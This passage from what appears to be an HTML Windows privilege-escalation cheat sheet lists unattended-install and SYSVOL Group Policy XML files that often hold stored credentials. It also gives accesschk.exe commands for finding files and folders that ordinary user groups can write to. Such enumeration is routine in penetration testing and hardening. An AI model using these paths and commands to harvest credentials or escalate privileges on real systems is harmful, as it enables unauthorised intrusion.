                    <pre><code>c:\sysprep\sysprep.xml</code></pre>
                    <pre><code>%WINDIR%\Panther\Unattend\Unattended.xml</code></pre>
                    <pre><code>%WINDIR%\Panther\Unattended.xml</code></pre>

                    <div class="tool-command">Domain Controller Symbol Policy Files:</div>
                    <pre><code>%SYSTEMROOT%\SYSVOL\sysvol</code></pre>
                    <pre><code>\\<DOMAIN>\SYSVOL\<DOMAIN>\Policies\</code></pre>

                    <div class="tool-command">Element-Specific Attributes in XML Files:</div>
                    <pre><code>Services\Services.xml: Element-Specific Attributes</code></pre>
                    <pre><code>ScheduledTasks\ScheduledTasks.xml: Task Inner Element, TaskV2 Inner Element, ImmediateTaskV2 Inner Element</code></pre>
                    <pre><code>Printers\Printers.xml: SharedPrinter Element</code></pre>
                    <pre><code>Drives\Drives.xml: Element-Specific Attributes</code></pre>
                    <pre><code>DataSources\DataSources.xml: Element-Specific Attributes</code></pre>
                </div>
            </div>
            <!-- Weak Folder Permissions Content -->
            <div class="tool-row">
                <div class="tool-name" onclick="toggleDetails('weak-folder-permissions')">Weak Folder Permissions</div>
                <div class="tool-details" id="weak-folder-permissions">
                    <h3>Find All Weak Folder Permissions Per Drive</h3>
                    <div class="tool-command">Check permissions for Users group:</div>
                    <pre><code>accesschk.exe -uwdqs Users c:\</code></pre>

                    <div class="tool-command">Check permissions for Authenticated Users group:</div>
                    <pre><code>accesschk.exe -uwdqs "Authenticated Users" c:\</code></pre>
                </div>
            </div>
            <!-- Weak File Permissions Content -->
            <div class="tool-row">
                <div class="tool-name" onclick="toggleDetails('weak-file-permissions')">Weak File Permissions</div>
                <div class="tool-details" id="weak-file-permissions">
                    <h3>Find All Weak File Permissions Per Drive</h3>
                    <div class="tool-command">Check permissions for Users group on all files:</div>
                    <pre><code>accesschk.exe -uwqs Users c:\*.*</code></pre>

                    <div class="tool-command">Check permissions for Authenticated Users group on all files:</div>
                    <pre><code>accesschk.exe -uwqs "Authenticated Users" c:\*.*</code></pre>
                </div>
            </div>